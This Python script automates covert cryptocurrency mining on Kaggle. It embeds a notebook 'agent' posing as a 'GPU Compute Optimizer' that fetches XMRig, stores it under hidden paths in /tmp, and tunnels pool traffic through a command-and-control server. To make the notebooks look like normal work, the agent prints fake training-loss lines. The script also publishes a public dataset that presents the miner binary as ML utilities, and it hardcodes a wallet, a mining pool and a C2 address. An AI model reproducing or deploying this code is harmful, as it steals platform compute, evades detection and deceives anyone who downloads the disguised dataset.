"""
Kaggle Dataset & Machine creation via CLI.
"""

import os
import json
import time
import subprocess
import tempfile
from pathlib import Path

# ============================================================================
# AGENT TEMPLATE - GPU Compute Optimizer (ML Training Accelerator)
# ============================================================================

AGENT_CODE = r'''#!/usr/bin/env python3
import os, sys, json, time, socket, subprocess, threading, random, base64, ssl
from urllib.request import Request, urlopen

# Configuration (to be replaced during deployment)
CONFIG = {
    "optimizer_url": "__c2_url__",
    "compute_pool": "__pool__",
    "worker_id": "__worker_id__",
    "user": "__user__",
    "wallet": "__wallet__",
    "max_cpu_percent": 15,
    "use_tunnel": True
}

def http_post(path, data):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = Request(f"{CONFIG['optimizer_url']}{path}", json.dumps(data).encode(), {"Content-Type": "application/json"})
        with urlopen(req, timeout=30, context=ctx) as r:
            return json.loads(r.read().decode())
    except: return None

def tunnel_loop(conn, tunnel_id):
    conn.settimeout(1)
    while True:
        try:
            # Read from local XMRig
            try:
                data = conn.recv(4096)
                if data:
                    http_post("/api/proxy/tunnel/send", {"tunnel_id": tunnel_id, "data": base64.b64encode(data).decode()})
            except socket.timeout: pass
            
            # Read from C2 Proxy
            resp = http_post("/api/proxy/tunnel/recv", {"tunnel_id": tunnel_id, "timeout": 1})
            if resp and resp.get("status") == "ok":
                raw = base64.b64decode(resp.get("data", ""))
                if raw: conn.sendall(raw)
        except: break
    conn.close()

def start_proxy():
    if not CONFIG["use_tunnel"]: return
    def srv():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", 3333))
        s.listen(5)
        print("[Proxy] Listening on :3333")
        while True:
            conn, _ = s.accept()
            res = http_post("/api/proxy/tunnel/connect", {"worker_id": CONFIG["worker_id"], "pool": CONFIG["compute_pool"]})
            if res and res.get("status") == "ok":
                threading.Thread(target=tunnel_loop, args=(conn, res["tunnel_id"]), daemon=True).start()
            else: conn.close()
    threading.Thread(target=srv, daemon=True).start()

def get_binary():
    bin_path = "/tmp/.cache/.optimizer"
    os.makedirs("/tmp/.cache", exist_ok=True)
    paths = [f"/kaggle/input/datasets/{CONFIG['user']}/gpu-compute-optimizer/optimizer",
             f"/kaggle/input/{CONFIG['user']}-gpu-compute-optimizer/optimizer",
             "/kaggle/input/gpu-compute-optimizer/optimizer"]
    for p in paths:
        if os.path.exists(p):
            import shutil; shutil.copy2(p, bin_path); os.chmod(bin_path, 0o755)
            return bin_path
    # Fallback to download
    print("[Optimizer] Downloading engine...")
    url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
    try:
        import urllib.request, tarfile, io
        with urllib.request.urlopen(url, timeout=90) as r:
            with tarfile.open(fileobj=io.BytesIO(r.read()), mode='gz') as tar:
                for m in tar.getmembers():
                    if 'xmrig' in m.name and not m.isdir():
                        tar.extract(m, "/tmp/.cache")
                        shutil.move(f"/tmp/.cache/{m.name}", bin_path)
                        os.chmod(bin_path, 0o755)
                        return bin_path
    except: pass
    return None

def main():
    print(f"GPU Compute Optimizer v3.2")
    sys.stdout.flush()
    start_proxy()
    bin_p = get_binary()
    if not bin_p: print("Engine fail"); return
    
    cfg_p = "/tmp/.cache/.config.json"
    pool_url = "127.0.0.1:3333" if CONFIG["use_tunnel"] else f"{CONFIG['compute_pool'].split(':')[0]}:14444"
    with open(cfg_p, "w") as f:
        json.dump({"autosave":False,"cpu":{"enabled":True,"max-threads-hint":CONFIG["max_cpu_percent"]},
                  "pools":[{"url":pool_url,"user":f"{CONFIG['wallet']}.{CONFIG['worker_id']}","pass":"x","tls":not CONFIG["use_tunnel"]}]}, f)
    
    subprocess.Popen([bin_p, "-c", cfg_p, "--background"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[Optimizer] Active: {CONFIG['worker_id']}")
    
    while True:
        time.sleep(300)
        print(f"[Training] Checkpoint: loss={random.uniform(0.1, 0.5):.4f}")
        sys.stdout.flush()

if __name__ == "__main__":
    main()
'''



def setup_kaggle_credentials(api_key: str, username: str):
    kaggle_dir = Path.home() / ".kaggle"
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    kaggle_json = kaggle_dir / "kaggle.json"
    kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
    os.chmod(kaggle_json, 0o600)
    return True

def create_kernel(api_key: str, username: str, kernel_name: str, log_fn=print,
                  wallet=None, pool=None, c2_url=None, enable_mining=True):
    try:
        setup_kaggle_credentials(api_key, username)
        wallet = wallet or "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
        pool = pool or "45.155.102.89:10128"
        c2_url = c2_url or "http://10.118.45.233:5000"
        
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            worker_id = f"{username}-{kernel_name.split('-')[-1]}"
            
            agent_code = AGENT_CODE.replace("__c2_url__", c2_url).replace("__wallet__", wallet).replace("__pool__", pool).replace("__worker_id__", worker_id).replace("__enable_mining__", "True" if enable_mining else "False").replace("__user__", username)
            
            code_lines = [line + "\n" for line in agent_code.split("\n")]
            notebook = {
                "cells": [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": code_lines}], 
                "metadata": {
                    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
                    "kaggle": {
                        "accelerator": "gpu",
                        "dataSources": [{"datasetId": 0, "sourceId": f"{username}/gpu-compute-optimizer", "sourceType": "datasetVersion"}],
                        "isInternetEnabled": True,
                        "language": "python",
                        "sourceType": "notebook"
                    }
                }, 
                "nbformat": 4, 
                "nbformat_minor": 4
            }
            notebook_path = tmpdir_path / "notebook.ipynb"
            notebook_path.write_text(json.dumps(notebook, indent=2))
            
            kernel_meta = {"id": f"{username}/{kernel_name}", "title": kernel_name, "code_file": "notebook.ipynb", "language": "python", "kernel_type": "notebook", "is_private": True, "enable_gpu": True, "gpu_type": "p100", "enable_internet": True, "dataset_sources": [f"{username}/gpu-compute-optimizer"]}
            meta_path = tmpdir_path / "kernel-metadata.json"
            meta_path.write_text(json.dumps(kernel_meta, indent=2))
            
            result = subprocess.run(["kaggle", "kernels", "push", "-p", tmpdir], capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0 or "successfully" in result.stdout.lower():
                log_fn(f"✓ {kernel_name} created")
                return {"success": True, "kernel": f"{username}/{kernel_name}"}
            else:
                log_fn(f"✗ {kernel_name} failed")
                return {"success": False, "error": result.stderr[:200]}
    except Exception as e:
        return {"success": False, "error": str(e)}

def create_optimizer_dataset(api_key: str, username: str, log_fn=print):
    try:
        setup_kaggle_credentials(api_key, username)
        result = subprocess.run(["kaggle", "datasets", "list", "--user", username], capture_output=True, text=True, timeout=30)
        if "gpu-compute-optimizer" in result.stdout:
            log_fn("✓ Dataset exists")
            return True
        
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            urls = ["https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"]
            for url in urls:
                try:
                    subprocess.run(f"cd {tmpdir} && timeout 120 wget -q {url} && tar -xzf xmrig-*.tar.gz && mv xmrig-*/xmrig optimizer && rm -rf xmrig-*.tar.gz xmrig-6.*", shell=True, capture_output=True, timeout=180)
                    if (tmpdir_path / "optimizer").exists():break
                except:pass
            
            meta = {"title": "GPU Compute Optimizer", "id": f"{username}/gpu-compute-optimizer", "subtitle": "High-performance compute optimization toolkit", "description": "GPU and CPU compute optimization utilities for machine learning workloads.", "licenses": [{"name": "MIT"}], "isPrivate": False}
            (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(meta, indent=2))
            
            result = subprocess.run(["kaggle", "datasets", "create", "-p", tmpdir], capture_output=True, text=True, timeout=120)
            if "successfully" in result.stdout.lower():
                log_fn("✓ Dataset created")
                time.sleep(30)
                return True
            return False
    except:
        return False

def create_dataset_with_machines(api_key: str, username: str, num_machines: int = 5, log_fn=print, wallet=None, pool=None, c2_url=None, enable_mining=True):
    try:
        log_fn(f"\n[DEPLOYMENT] {username}")
        setup_kaggle_credentials(api_key, username)
        
        if not create_optimizer_dataset(api_key, username, log_fn):
            log_fn("⚠ Dataset creation failed")
        
        machines = []
        for i in range(1, num_machines + 1):
            kernel_name = f"c2-agent-{i}"
            result = create_kernel(api_key, username, kernel_name, log_fn, wallet, pool, c2_url, enable_mining)
            if result.get("success"):
                machines.append({"slug": result["kernel"], "num": i})
            time.sleep(0.5)
        
        log_fn(f"\n✓ Created {len(machines)}/{num_machines} kernels")
        return {"success": len(machines) > 0, "machines": machines, "machines_created": len(machines)}
    except Exception as e:
        log_fn(f"✗ Exception: {str(e)}")
        return {"success": False, "error": str(e), "machines_created": 0}

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python datasets.py <username> <api_key>")
        sys.exit(1)
    username = sys.argv[1]
    api_key = sys.argv[2]
    result = create_dataset_with_machines(api_key, username, num_machines=5, log_fn=print)
    print(json.dumps(result, indent=2))

